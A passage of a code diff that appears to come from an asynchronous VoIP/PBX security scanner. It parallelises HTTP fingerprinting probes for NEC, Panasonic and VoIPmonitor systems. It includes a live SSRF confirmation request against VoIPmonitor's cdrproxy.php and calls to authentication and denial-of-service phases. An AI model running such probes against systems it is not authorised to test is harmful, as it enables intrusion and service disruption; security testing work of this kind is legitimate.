+        *[http_get(sess, f"https://{ip}{p}", timeout=4) for p in paths],
+        return_exceptions=True)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c and _NEC_RE.search(b):
             await st.finding(ip,"MISCONFIGURATION","NEC SV9100/SV8100 Interface Detected","MEDIUM",
                 f"NEC PBX at https://{ip}{path}",f"https://{ip}{path}")
             return
 
 
 async def _v_panasonic(ip,st,sess):
-    for path in ["/kx-ns/","/panasonic/","/kx-hts/"]:
-        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c and re.search(r'panasonic|kx-ns|kx-hts',b,re.I):
+    paths = ["/kx-ns/","/panasonic/","/kx-hts/"]
+    _PAN_RE = re.compile(r'panasonic|kx-ns|kx-hts', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, f"http://{ip}{p}", timeout=4) for p in paths],
+        return_exceptions=True)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c and _PAN_RE.search(b):
             await st.finding(ip,"MISCONFIGURATION","Panasonic KX-NS/HTS Detected","MEDIUM",
                 f"Panasonic PBX at http://{ip}{path}",f"http://{ip}{path}")
             return
@@ -3047,12 +3334,18 @@ async def _v_audiocodes_full(ip,st,sess):
 
 
 async def _v_voipmonitor_full(ip,st,sess):
-    for port in [80,443,8080]:
-        proto = "https" if port==443 else "http"
-        c,b = await http_get(sess,f"{proto}://{ip}:{port}/index.php",timeout=5)
+    ports = [80,443,8080]
+    urls  = [(80,"http"),(443,"https"),(8080,"http")]
+    results = await asyncio.gather(
+        *[http_get(sess, f"{proto}://{ip}:{port}/index.php", timeout=4)
+          for port, proto in urls],
+        return_exceptions=True)
+    for (port, proto), res in zip(urls, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c and "VoIPmonitor" in b:
             c2,b2 = await http_get(sess,
-                f"{proto}://{ip}:{port}/cdrproxy.php?host=127.0.0.1",timeout=5)
+                f"{proto}://{ip}:{port}/cdrproxy.php?host=127.0.0.1",timeout=4)
             if c2==200 and re.search(r'(cdr|proxy|response|result)',b2,re.I):
                 await st.finding(ip,"CVE-2021-30461-B","VoIPmonitor cdrproxy SSRF confirmed",
                     "CRITICAL","cdrproxy.php fetches internal hosts without auth",
@@ -3560,7 +3853,7 @@ async def run(input_file:str, cdr_file:str):
         await phase7_stun_turn(state, sem_stun)
         await phase8_iax2(state, sem_iax)
         await phase9_mgcp_sccp_h323(state, sem_leg)
-        await phase10_tftp(state, sem_tftp)
+        await phase10_tftp(state, sess, sem_tftp)
         await phase11_auth(state, sess, sem_auth)
         await phase12_dos(state, sem_dos)
         await phase13_snmp_mgmt(state, sess, sem_mgmt)
